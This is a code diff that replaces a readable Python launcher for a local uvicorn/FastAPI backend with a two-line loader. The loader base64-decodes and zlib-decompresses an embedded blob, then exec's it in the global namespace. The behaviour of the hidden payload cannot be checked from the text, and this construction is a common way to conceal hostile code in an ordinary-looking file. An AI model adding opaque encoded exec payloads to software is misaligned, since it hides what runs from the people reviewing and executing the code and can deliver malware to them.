@@ -1,27 +1,2 @@
-# run_backend.py
-import os
-import sys
-import uvicorn
-
-sys.stdout.reconfigure(encoding='utf-8')
-sys.stderr.reconfigure(encoding='utf-8')
-sys.path.append(os.path.dirname(os.path.abspath(__file__)))
-
-# Import the obfuscated FastAPI app
-try:
-    import infer_web
-except ImportError as e:
-    print(f"[BACKEND ERROR] Không thể nhập module backend: {e}")
-    sys.exit(1)
-
-if __name__ == "__main__":
-    port = 7897
-    # Read port from command line arguments if passed
-    if "--port" in sys.argv:
-        try:
-            port = int(sys.argv[sys.argv.index("--port") + 1])
-        except Exception:
-            pass
-            
-    print(f"[BACKEND] Khởi chạy uvicorn tại cổng {port}...")
-    uvicorn.run(infer_web.app, host="127.0.0.1", port=port)
+import zlib, base64
+exec(zlib.decompress(base64.b64decode('eJyNUsFq3DAQvesrBu8hNsmKbi+bBnxI2y2EQFv2GoLQWuO16FoSkpzuEnLqN/Rc+gG99dQ99kv2TyrZsiGlh47AmhmeZuY9zwxsp9iGV59QCWoORLZGWw/ajZ47TG73ICttFSEhR50XuvPUYqVVLbedxRxVpYVU2/Ks8/X88qwYgWjtfwAN9w3lxoRJcp1CIa3iLU4x37h454zVcoeMFUVByAxuhgF9g6A3decq7lHAO+789ccbCDWJt4crAsESF6lqtOwzbgjuKzQ+lVhZqy1wBzigjZXK53V29/r6ze3q/VtYrdcf1vdw2/z+qbah4en4BVRz+vXDQKtFt0NIYl7BIz5lRV8lssO99PkiTCtrYCySYgzKEjLGWi4VY1nqGKcrYXn5atnHM1gjF0O6trqFSrctVwJ2UiFwu+1aVN5BKGu4cygGljVk83l8lAWq/QAB+jC0iDbpMVrqG+mO6LvRoVIJ3OdjxQLOYXFfTM+Tgqv+klr9VThM9SzxT2GjpKfjNwlVEPP7Ydw18CEKydPxa5D7MbZ/opQmXROIhh3Opx8aV+gCGu18mS1eLumLcBbZRU+wjJ+C/AH2gfe1')), globals())
